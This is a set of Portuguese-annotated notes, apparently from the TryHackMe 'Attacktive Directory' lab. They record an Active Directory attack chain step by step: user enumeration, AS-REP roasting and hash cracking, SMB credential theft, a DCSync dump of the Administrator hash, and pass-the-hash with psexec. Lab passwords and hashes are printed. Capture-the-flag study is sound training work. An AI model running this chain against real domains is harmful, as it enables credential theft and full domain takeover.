@@ -1,0 +1,114 @@
+enum4linux -a (IP)
+
+[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''
+
+S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
+S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
+S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
+S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
+S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
+
+-------------------------------------------------------------------------------------------------
+
+sudo nmap -sS -sV -Pn -p- (IP)
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-25 11:17:37Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49687/tcp open  msrpc         Microsoft Windows RPC
+49695/tcp open  msrpc         Microsoft Windows RPC
+49836/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 86.13 seconds
+
+
+Enumeração de usuários via Kerberos:
+
+-> kerbrute userenum --dc spookysec.local -d spookysec.local /home/nanoxsec/Downloads/wordlists/Wordlists/username.txt 
+-> sudo nano /etc/hosts ip 	domain
+
+2026/02/25 08:40:42 >  [+] VALID USERNAME:	 paradox@spookysec.local
+2026/02/25 08:40:42 >  [+] VALID USERNAME:	 james@spookysec.local
+2026/02/25 08:40:42 >  [+] VALID USERNAME:	 Administrator@spookysec.local
+2026/02/25 08:40:42 >  [+] VALID USERNAME:	 James@spookysec.local
+2026/02/25 08:40:42 >  [+] VALID USERNAME:	 darkstar@spookysec.local
+2026/02/25 08:40:42 >  [+] VALID USERNAME:	 backup@spookysec.local
+2026/02/25 08:40:42 >  [+] VALID USERNAME:	 administrator@spookysec.local
+2026/02/25 08:40:42 >  [+] VALID USERNAME:	 Robin@spookysec.local
+2026/02/25 08:40:42 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
+2026/02/25 08:40:42 >  [+] VALID USERNAME:	 JAMES@spookysec.local
+2026/02/25 08:40:42 >  [+] VALID USERNAME:	 robin@spookysec.local
+2026/02/25 08:40:42 >  [+] VALID USERNAME:	 Administrator@spookysec.local
+2026/02/25 08:40:43 >  [+] VALID USERNAME:	 james@spookysec.local
+2026/02/25 08:40:43 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
+2026/02/25 08:40:50 >  [+] VALID USERNAME:	 James@spookysec.local
+2026/02/25 08:40:51 >  [+] VALID USERNAME:	 robin@spookysec.local
+2026/02/25 08:41:04 >  [+] VALID USERNAME:	 darkstar@spookysec.local
+2026/02/25 08:41:13 >  [+] VALID USERNAME:	 administrator@spookysec.local
+2026/02/25 08:41:29 >  [+] VALID USERNAME:	 backup@spookysec.local
+2026/02/25 08:41:36 >  [+] VALID USERNAME:	 paradox@spookysec.local
+
+
+A partir da saída, podemos validar alguns nomes de usuário ativos.
+Agora que descobrimos vários nomes de usuário, podemos usar uma técnica chamada ASREPRoasting, o que significa que se um usuário não tiver a propriedade de pré-autenticação do Kerberos selecionada, é possível recuperar o hash de senha desse usuário. O Impacket fornece uma ferramenta chamada GetNPusers.py que pode consultar o AD e, se a propriedade acima não for seletiva, exportará seu TGT.
+
+--> python3 GetNPUsers.py spookysec.local/svc-admin
+--> netexec ldap 10.67.129.157 -u svc-admin -p '' --asreproast out.txt (FAZ O MESMO)
+
+hash do avc-admin: 
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL56d4242c86477d8132abf913c48483cc$59f2677858e2b65f7b196c977aad9d4d746a9a501af22c69704064c93f3bd6861be7dfc2b9177a74a3058f06be470fac31d9289c523da8da186132dd9e776fcb4fa2ab38dd8db3b01b5418dfc2a5bf45272c5cc24aea1d6c6885fc004973db038d83bc779b90b1b5f4b5e18b1bffbe4b04e8fe22de68b8a0823b2d0a86ba730d632063c078d21b1f1750a1d81eae0da15295d1c7c40cb74db975b3c48108772213b69ea84f0f0a831e383af50b2fb836751988341cb62a3fe599bb4d25ac484fca9d34c9ba2089f7622c6e80382e356dd22ae4c37e50b53be67b962d0a43fb7b0449bf7a595119832fa719f4f62fd1df9cef
+
+quebrando a hash com hashcat:
+
+--> hashcat -m 18200 hash.txt WORDLIST.TXT --force
+--> management2005
+
+--> smbclient -L spookysec.local --user svc-admin
+--> smbclient \\\\spookysec.local\\\backup --user svc-admin
+--> get backup_credentials.txt
+--> quit
+
+--> cat backup_credentials.txt
+--> echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
+--> backup@spookysec.local:backup2517860
+--> secretsdump.py -just-dc backup@spookysec.local
+	|_> Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+	|_> Administrator:0e0363213e37b94221497260b0bcb4fc
+--> psexec.py Administrator:@spookysec.local -hashes 0e0363213e37b94221497260b0bcb4fc
